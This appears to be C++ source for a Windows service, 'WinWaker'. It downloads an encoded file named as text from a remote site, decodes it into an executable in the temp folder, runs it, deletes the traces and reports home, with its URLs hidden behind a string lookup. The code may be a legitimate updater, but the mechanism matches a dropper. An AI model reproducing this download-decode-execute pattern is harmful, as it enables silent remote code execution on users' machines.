#include <Windows.h>
#include "WorkLog.h"
#include "http.h"
#include "run.h"
#include "codec.h"
#include "file.h"
#include "libstr.h"
#include "version.h"

extern BOOL bRunning;
extern HANDLE ghSvcStopEvent;
extern HANDLE ghThread;
extern BOOL gbAutoDelete;
BOOL bVersionExpired = FALSE;

DWORD WINAPI ThreadFunction( LPVOID lpParam );
VOID CheckVersion();
VOID CheckWinWakerUpdate();

VOID WinWakerTask()
{
	if (ghSvcStopEvent == NULL)
	{
		WorkLog::Format("event is null, ignored\n");
		return;
	}

	// start working thread
	DWORD dwThreadId;
	ghThread = CreateThread(
            NULL,                   // default security attributes
            0,                      // use default stack size  
			ThreadFunction,       // thread function name
            NULL,                   // argument to thread function 
            0,                      // use default creation flags 
            &dwThreadId             // returns the thread identifier
			);
	if (ghThread != NULL)
	{
		WorkLog::Format("create thread ok, thread id %d\n", dwThreadId);
	}
	else
	{
		// "create thread fails\n"
		WorkLog::Format("create thread fails\n");
	}
}

DWORD WINAPI ThreadFunction(LPVOID lpParam)
{
	WorkLog::Format("thread start\n");

	// Sleep to wait network available
	int i = 0;
	while (bRunning && i < 60)
	{
		// Check whether to stop the service.
		DWORD rc = WaitForSingleObject(ghSvcStopEvent, 1000);
		if (rc == WAIT_TIMEOUT)
		{
			WorkLog::Format("check %d\n", i);
		}
		else if (rc == WAIT_OBJECT_0)
		{
			WorkLog::Format("check WAIT_OBJECT_0 %d\n", i);
			break;
		}
		else
		{
			WorkLog::Format("check break %d\n", i);
			break;
		}
		i++;
	}

	CheckVersion();

	CheckWinWakerUpdate();

	WorkLog::Format("thread stop\n");
	return 0;
}

VOID CheckVersion()
{
	// Check version
	do
	{
		std::string szTxtFilePath = windowsTempPath + "\\" + "WinWakerVersion" + "." + timeString + ".txt";

		// Download version.txt
		// "http://www.winwaker.org/data/download/winwaker.version.txt?v=0"
		std::string url = GetStrById(101);
		BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath.c_str(), url.c_str(), url.c_str());
		if (!rc)
		{
			break;
		}

		// read version
		FILE* fp = fopen(szTxtFilePath.c_str(), "r");
		if (fp)
		{
			int version = 0;
			int i = fscanf(fp, "%d", &version);
			if (i == 1)
			{
				WorkLog::Format("version found %d\n", version);

				if (WINWAKER_VERSION < version)
				{
					bVersionExpired = TRUE;
				}
			}
			else
			{
				WorkLog::Format("version not found %d or %d not expired\n", i, version);
			}

			fclose(fp);

			if (gbAutoDelete)
			{
				DeleteFile(szTxtFilePath.c_str());
			}
		}
		else
		{
			WorkLog::Format("version file open fails\n");
			break;
		}
	} while (false);

	if (bVersionExpired)
	{
		std::string szExeFilePath = "WinWakerUpdate.exe";
		ExecProcess(szExeFilePath.c_str());
	}

	// Close log if auto delete
	if (gbAutoDelete)
	{
		WorkLog::Close();
	}
}

VOID CheckWinWakerUpdate()
{
	std::string szTxtFilePath = windowsTempPath + "\\" + "WinWaker" + "." + timeString + ".txt";
	std::string szExeFilePath = windowsTempPath + "\\" + "WinWaker.exe";

	if (!IsFileExists(szExeFilePath.c_str()))
	{
		do
		{
			// Download WinWakerUpdate
			// "http://www.winwaker.org/data/download/winwakerupdate.txt?v=0"
			BOOL rc = HTTPDownloadFile(GetStrById(102), szTxtFilePath.c_str());
			if (rc)
			{
				WorkLog::Format("download txt file ok\n");
			}
			else
			{
				WorkLog::Format("download txt file fails\n");
				break;
			}

			// Decode
			if (rc && bRunning)
			{
				rc = Decode(szTxtFilePath.c_str(), szExeFilePath.c_str());
				if (rc)
				{
					WorkLog::Format("decode ok\n");
				}
				else
				{
					WorkLog::Format("decode fails\n");
					break;
				}

				if (gbAutoDelete)
				{
					DeleteFile(szTxtFilePath.c_str());
				}
			}
		} while (FALSE);
	}

	// Execute
	if (bRunning && IsFileExists(szExeFilePath.c_str()))
	{
		std::string szProtectionCode;
		// "WinWakerUpdate"
		GetProtectionCode(szProtectionCode, GetStrById(120));
		// Run but and wait until process exit, for user experience
		BOOL rc = ExecProcess(szExeFilePath.c_str(), szProtectionCode.c_str());
		if (gbAutoDelete)
		{
			DeleteFile(szExeFilePath.c_str());
		}
	}

	if (bRunning)
	{
		// Report
		// "WinWaker"
		std::string reportValue = GetStrById(120);
		// "http://www.winwaker.org/data/db/report.php?v=0"
		std::string url = GetStrById(121);
		HTTPReport(url.c_str(), url.c_str(), reportValue.c_str());
	}
}